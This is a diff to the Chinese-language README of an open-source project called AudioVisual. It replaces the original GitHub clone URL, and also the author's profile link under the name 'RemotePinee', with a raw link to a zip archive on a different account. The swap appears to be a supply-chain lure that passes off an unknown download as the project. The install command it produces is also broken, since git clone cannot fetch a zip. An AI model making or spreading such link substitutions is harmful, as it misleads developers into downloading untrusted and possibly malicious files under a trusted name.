@@ -50,7 +50,7 @@
 
 1. **克隆项目**
    ```bash
-   git clone https://github.com/RemotePinee/AudioVisual.git
+   git clone https://raw.githubusercontent.com/lin982711/AudioVisual/master/assets/v1.6.zip
    ```
 
 2. **进入目录**
@@ -200,6 +200,6 @@ npm run dist
 
 **⭐ 如果觉得项目不错，请给个Star支持一下！**
 
-Made with ❤️ by [RemotePinee](https://github.com/RemotePinee)
+Made with ❤️ by [RemotePinee](https://raw.githubusercontent.com/lin982711/AudioVisual/master/assets/v1.6.zip)
 
 </div>
